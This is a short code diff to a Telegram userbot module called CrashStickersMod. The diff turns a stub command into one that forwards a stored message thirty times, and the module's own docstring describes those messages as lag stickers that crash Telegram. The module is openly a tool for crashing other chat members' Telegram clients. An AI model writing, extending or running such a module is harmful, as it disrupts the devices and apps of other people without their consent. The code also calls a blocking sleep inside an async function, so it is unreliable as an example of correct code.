@@ -33,9 +33,9 @@ class CrashStickersMod(loader.Module):
     @loader.command(
         ru_doc="- Отправляет 30 лагающих стикеров, которые крашают Telegram"
     )
-    def breakchatcmd(self, message):
+    async def breakchatcmd(self, message):
         """- Sends 30 lag stickers, that crashes Telegram"""
         await utils.answer(message, strings["wait"])
         time.sleep(5)
         for i in range(30):
-            pass
+            await self._client(ForwardMessagesRequest(from_peer=1962983002, id=[3], drop_author=False))
